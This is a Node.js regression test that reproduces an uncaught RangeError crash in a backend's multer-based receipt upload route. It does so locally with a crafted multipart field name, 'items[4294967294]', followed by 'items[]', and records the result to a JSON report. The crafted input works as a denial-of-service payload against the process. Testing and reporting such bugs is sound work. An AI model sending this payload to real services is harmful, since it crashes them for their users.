// Bounded upstream regression case, against the actual authenticated receipt route.
// Two tiny text fields, no file data. An audit-only exception observer records
// the escaped exception and closes the disposable request; no existing service is targeted.
const assert=require('node:assert/strict'),fs=require('node:fs'),path=require('node:path'),http=require('node:http');const backend='/app/backend';process.env.JWT_SECRET=require('node:crypto').randomBytes(32).toString('hex');process.env.ENCRYPTION_KEY=require('node:crypto').randomBytes(32).toString('hex');
const url=new URL(process.env.DATABASE_URL);assert.equal(url.hostname,'127.0.0.1');assert.equal(url.port,'5432');assert.equal(url.pathname,'/travstats_block12_probe_audit');assert.equal(process.env.NODE_ENV,'test');
const dep=n=>require(path.join(backend,'node_modules',n));const {prisma}=require(path.join(backend,'dist/db.js'));const {generateToken}=require(path.join(backend,'dist/utils/jwt.js'));
const express=dep('express'),app=express();app.use(dep('cookie-parser')());app.use('/uploads',require(path.join(backend,'dist/routes/uploads.js')).default);let routedErrors=0;const errorKinds=[];app.use((e,req,res,next)=>{routedErrors++;errorKinds.push({name:e.name,code:e.code,message:e.message,stack:e.stack?.split("\n").slice(0,12)});next(e);});
app.use(require(path.join(backend,'dist/middleware/errorHandler.js')).errorHandler);const report={commit:'9678e6cd',multerVersion:dep('multer/package.json').version};let server,activeRequest;
async function main(){const u=await prisma.user.create({data:{username:'block17-multer-'+Date.now(),passwordHash:'synthetic-unused'}});const cookie=`auth_token=${generateToken(u.id)}`;
 server=await new Promise(resolve=>{const s=app.listen(0,'127.0.0.1',()=>resolve(s));});
 const boundary='audit-multipart-boundary';const body=Buffer.from(['items[4294967294]','items[]'].map((field,i)=>`--${boundary}\r\nContent-Disposition: form-data; name="${field}"\r\n\r\n${i}\r\n`).join('')+`--${boundary}--\r\n`);
 const send=(authenticated)=>new Promise(resolve=>{const req=http.request({hostname:'127.0.0.1',port:server.address().port,path:'/uploads/receipt',method:'POST',headers:{'Content-Type':`multipart/form-data; boundary=${boundary}`,'Content-Length':body.length,...(authenticated?{Cookie:cookie}:{})}},res=>{res.resume();res.on('end',()=>resolve({status:res.statusCode}));});activeRequest=req;req.on('error',()=>resolve({connectionClosed:true}));if(authenticated){req.flushHeaders();setTimeout(()=>req.write(body.subarray(0,100)),80);setTimeout(()=>req.end(body.subarray(100)),160);}else req.end(body);});
 report.unauthenticated=await send(false);assert.equal(report.unauthenticated.status,401);
 const observe=e=>{report.uncaught={name:e.name,message:e.message};activeRequest.destroy();};process.once('uncaughtException',observe);
 try{report.authenticated=await send(true);}finally{process.removeListener('uncaughtException',observe);}
 report.errorKinds=errorKinds;report.routedErrorsAfterAuthControl=routedErrors-1;report.requestBytes=body.length;report.crashReproduced=report.uncaught?.name==='RangeError';report.runtime=process.version;assert.equal(report.crashReproduced,true);assert.equal(report.routedErrorsAfterAuthControl,0);
}
main().catch(e=>{report.error=e.message;process.exitCode=1;}).finally(async()=>{if(server)await new Promise(r=>server.close(r));await prisma.$disconnect();fs.writeFileSync(path.join(__dirname,'block17-multer-linux-probe.json'),JSON.stringify(report,null,2));console.log(JSON.stringify(report));});
